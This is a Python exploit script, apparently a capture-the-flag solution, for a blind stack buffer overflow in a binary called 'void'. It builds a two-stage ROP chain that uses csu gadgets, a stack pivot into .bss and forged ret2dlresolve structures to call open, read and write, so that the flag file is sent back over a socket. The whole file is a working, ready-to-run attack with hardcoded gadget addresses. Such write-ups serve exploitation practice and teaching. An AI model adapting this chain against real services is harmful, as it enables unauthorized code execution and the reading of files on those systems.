#!/usr/bin/env python3
"""void: main calls vuln, and vuln reads 200 bytes into a 64-byte stack buffer. No canary,
no PIE, and the service never writes anything back, so the exploit is blind. The only
imported function is read, so the flag is opened, read, and written with ret2dlresolve.

Stage A (in the overflow) calls read(0, STAGE, n) through the csu gadgets, then pivots
the stack to STAGE. Stage B is the full chain and the resolver structures.

The resolver needs room below rsp for its save area and frames, about 0xd80 bytes, so
STAGE is placed near the top of the writable .bss page.

Usage: python3 solve.py <ip> <port> [fd]
fd is the descriptor that open("flag.txt") returns on the server. Probing showed 5.
"""
import socket
import struct
import sys
import time

# Gadgets and addresses from the binary (no PIE)
PLT0 = 0x401020  # push link_map; jmp _dl_runtime_resolve
RET = 0x401142  # ret (end of vuln)
LEAVE_RET = 0x401141  # leave; ret (end of vuln)
G_POP = 0x4011B2  # pop rbx, rbp, r12, r13, r14, r15; ret
G_CALL = 0x401198  # mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]
G_EPI = 0x4011AE  # add rsp,8; pop rbx, rbp, r12, r13, r14, r15; ret
READ_GOT = 0x404018
SYMTAB, STRTAB, JMPREL = 0x400330, 0x400390, 0x400430  # DT_SYMTAB, DT_STRTAB, DT_JMPREL

# Writable memory used by the chain. Stay at or above 0x404038 so the resolver's
# frames stay inside writable memory, and at or below 0x404fff so the page holds everything.
STAGE = 0x404D58  # pivot target; the chain is read here
RETSLOT = 0x404EC0  # holds RET, a harmless call target after the chain
D_OPEN = 0x404ED0  # resolver structures for open("flag.txt")
D_WRITE = 0x404F40  # resolver structures for write()
BUF = 0x404FA0  # flag contents
LEN = 0x60
RES_OPEN = 0x404100  # r_offset slots, the resolver writes the resolved address here
RES_WRITE = 0x404108
STAGE_LEN = 0x404FFF + 1 - STAGE  # bytes from STAGE to the end of the page


def q(*vals):
    return b"".join(struct.pack("<Q", v & (2**64 - 1)) for v in vals)


def epi(rbx, rbp, r12, r13, r14, r15, nxt):
    # Pop block for G_EPI: pad, rbx, rbp, r12, r13, r14, r15, then the next address
    return q(0, rbx, rbp, r12, r13, r14, r15, nxt)


def align(a, x):
    return (x + a - 1) // a * a


def dlresolve(name, data_addr, resolution_addr, arg=b""):
    """Fake Elf64_Sym and Elf64_Rela for `name`, written at data_addr. The reloc index
    is chosen so that JMPREL + index*24 lands inside the payload, as pwntools does."""
    name_bytes = name + b"\0"
    sym_index = align(24, data_addr + len(name_bytes) - SYMTAB) // 24
    sym_addr = SYMTAB + 24 * sym_index
    sym = struct.pack("<IBBHQQ", data_addr - STRTAB, 0, 0, 0, 0, 0)
    reloc_index = align(24, sym_addr + 24 - JMPREL) // 24
    rel_addr = JMPREL + 24 * reloc_index
    rel = struct.pack("<QQQ", resolution_addr, (sym_index << 32) | 7, 0)

    arg_off = align(8, max(sym_addr - data_addr + 24, rel_addr - data_addr + 24))
    payload = bytearray(arg_off + len(arg))
    payload[0 : len(name_bytes)] = name_bytes
    payload[sym_addr - data_addr : sym_addr - data_addr + 24] = sym
    payload[rel_addr - data_addr : rel_addr - data_addr + 24] = rel
    payload[arg_off:] = arg
    return bytes(payload), reloc_index, data_addr + arg_off


def build(fd):
    open_payload, open_index, flag_ptr = dlresolve(b"open", D_OPEN, RES_OPEN, b"flag.txt\0")
    write_payload, write_index, _ = dlresolve(b"write", D_WRITE, RES_WRITE)

    # Stage B: the chain starts at STAGE+8 (STAGE+0 is the dummy rbp that leave pops).
    chain = q(G_POP, 0, 1, flag_ptr, 0, 0, RETSLOT, G_CALL)  # open(flag, 0, 0) via a harmless call
    chain += epi(0, 0, 0, 0, 0, 0, PLT0)  # resolve and call open
    chain += q(open_index, G_EPI)
    chain += epi(0, 1, fd, BUF, LEN, READ_GOT, G_CALL)  # read(fd, BUF, LEN)
    chain += epi(0, 1, 1, BUF, LEN, RETSLOT, G_CALL)  # write(1, BUF, LEN): set args, harmless call
    chain += epi(0, 0, 0, 0, 0, 0, PLT0)  # resolve and call write
    chain += q(write_index, G_EPI)
    # After write() the chain returns into garbage and crashes. The flag is already sent.

    blob = bytearray(STAGE_LEN)
    blob[0:8] = q(0)  # dummy rbp for leave
    blob[8 : 8 + len(chain)] = chain
    blob[RETSLOT - STAGE : RETSLOT - STAGE + 8] = q(RET)
    blob[D_OPEN - STAGE : D_OPEN - STAGE + len(open_payload)] = open_payload
    blob[D_WRITE - STAGE : D_WRITE - STAGE + len(write_payload)] = write_payload
    assert 8 + len(chain) <= RETSLOT - STAGE and D_OPEN + len(open_payload) <= D_WRITE
    assert D_WRITE + len(write_payload) <= BUF and BUF + LEN <= 0x405000

    # Stage A: 64 bytes of filler, saved rbp = STAGE, then csu read(0, STAGE, STAGE_LEN),
    # then leave; ret pivots the stack to STAGE.
    stage_a = b"A" * 64 + q(STAGE)
    stage_a += q(G_POP, 0, 1, 0, STAGE, STAGE_LEN, READ_GOT, G_CALL)
    stage_a += epi(0, STAGE, 0, 0, 0, 0, LEAVE_RET)
    assert len(stage_a) == 200
    return stage_a, bytes(blob)


def solve(host, port, fd):
    stage_a, stage_b = build(fd)
    with socket.create_connection((host, port), timeout=30) as s:
        s.sendall(stage_a)  # the overflow; vuln's read takes exactly these 200 bytes
        time.sleep(0.3)  # keep stage B out of the first read
        s.sendall(stage_b)  # read by stage A's csu call, then the chain runs
        out = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
    print(out.decode(errors="replace"))


if __name__ == "__main__":
    if len(sys.argv) not in (3, 4):
        print(f"usage: {sys.argv[0]} <ip> <port> [fd]")
        sys.exit(1)
    solve(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]) if len(sys.argv) == 4 else 5)
